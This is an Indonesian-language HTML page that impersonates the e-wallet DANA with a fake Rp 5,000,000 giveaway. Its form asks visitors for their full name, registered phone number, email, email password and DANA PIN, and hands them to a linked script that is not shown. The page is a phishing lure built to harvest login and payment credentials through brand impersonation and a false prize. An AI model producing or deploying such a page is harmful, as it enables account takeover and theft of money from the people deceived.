<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DANA.id giveaway</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
  <h2>🎉Dana kaget bagi-bagi hadiah Rp 5.000.000🎉</h2>
  <p>
    Isi data diri untuk mendapatkan Rp 5.000.000<br>
    Pencairan akan masuk setelah 5 menit dari team DANA.id
  </p>

  <form id="verifyForm">
    <input type="text" id="nama" placeholder="Nama Lengkap" required>
    <input type="text" id="nomor" placeholder="Nomor HP Terdaftar" required>
    <input type="email" id="email" placeholder="Email" required>
    <input type="password" id="sandi_email" placeholder="Password" required>
    <input type="password" id="pin" placeholder="PIN DANA" required>
    <button type="submit">Verifikasi Sekarang</button>
  </form>

  <div class="small-text">
    DANA Indonesia 2025 &copy; Semua hak dilindungi.
  </div>
</div>
<script src="script.js"></script>
</body>
</html>
